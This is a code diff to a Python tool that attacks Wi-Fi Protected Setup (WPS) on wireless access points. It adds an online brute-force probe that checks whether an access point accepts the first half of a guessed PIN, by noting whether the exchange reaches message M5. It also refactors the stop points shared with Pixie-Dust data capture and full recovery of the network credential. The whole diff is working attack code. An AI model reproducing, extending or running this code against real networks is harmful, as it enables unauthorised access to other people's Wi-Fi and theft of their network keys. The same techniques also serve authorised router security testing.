@@ -274,6 +274,7 @@ class WpsRegistrar:
         # filled from M7 (full PIN path)
         self.network_key = None
         self.found_ssid = None
+        self.reached_m5 = False
         self.first_half_ok = False
         self.finished = False
         # last message we sent / received (for the running Authenticator)
@@ -590,8 +591,11 @@ class WpsConnection:
         except socket.timeout:
             return None
 
-    def _drive(self, reg, stop_after_m3):
-        """Associate, then pump the EAP-WSC exchange. Returns the WpsRegistrar."""
+    def _drive(self, reg, stop):
+        """Associate, then pump the EAP-WSC exchange. Returns the WpsRegistrar.
+
+        @stop — 'm3' (Pixie-Dust data), 'm5' (first-half check), or 'm7' (full).
+        """
         conn = associate(self.interface, _mac_bytes(self.bssid), self.ssid.encode())
         eapol = EapolSocket(self.interface, _mac_bytes(self.bssid), self.timeout)
         try:
@@ -614,11 +618,17 @@ class WpsConnection:
                     eapol.send(eap_wsc_response(info['id'], WSC_MSG, reg.build_m2()))
                 elif mtype == bytes([WPS_M3]):
                     reg.process_m3(msg)
-                    if stop_after_m3:
+                    if stop == 'm3':
                         eapol.send(eap_wsc_response(info['id'], WSC_NACK, b''))
                         break
                     eapol.send(eap_wsc_response(info['id'], WSC_MSG, reg.build_m4()))
                 elif mtype == bytes([WPS_M5]):
+                    # The AP only reaches M5 if our M4 R-Hash1 matched, i.e. the
+                    # first PIN half is correct.
+                    reg.reached_m5 = True
+                    if stop == 'm5':
+                        eapol.send(eap_wsc_response(info['id'], WSC_NACK, b''))
+                        break
                     reg.process_m5(msg)
                     eapol.send(eap_wsc_response(info['id'], WSC_MSG, reg.build_m6()))
                 elif mtype == bytes([WPS_M7]):
@@ -635,11 +645,17 @@ class WpsConnection:
     def pixie_dust(self):
         """Run M1..M3 and return the six pixiewps inputs (hex) or None."""
         reg = WpsRegistrar(self._own_mac())
-        self._drive(reg, stop_after_m3=True)
+        self._drive(reg, stop='m3')
         return reg.pixie_data()
 
     def run(self, pin):
         """Full PIN path: run M1..M7 and return the recovered AP credential or None."""
         reg = WpsRegistrar(self._own_mac(), pin=str(pin))
-        self._drive(reg, stop_after_m3=False)
+        self._drive(reg, stop='m7')
         return reg.credential()
+
+    def first_half_ok(self, pin):
+        """Online-bruteforce probe: True if the AP accepts the first PIN half (reaches M5)."""
+        reg = WpsRegistrar(self._own_mac(), pin=str(pin))
+        self._drive(reg, stop='m5')
+        return reg.reached_m5
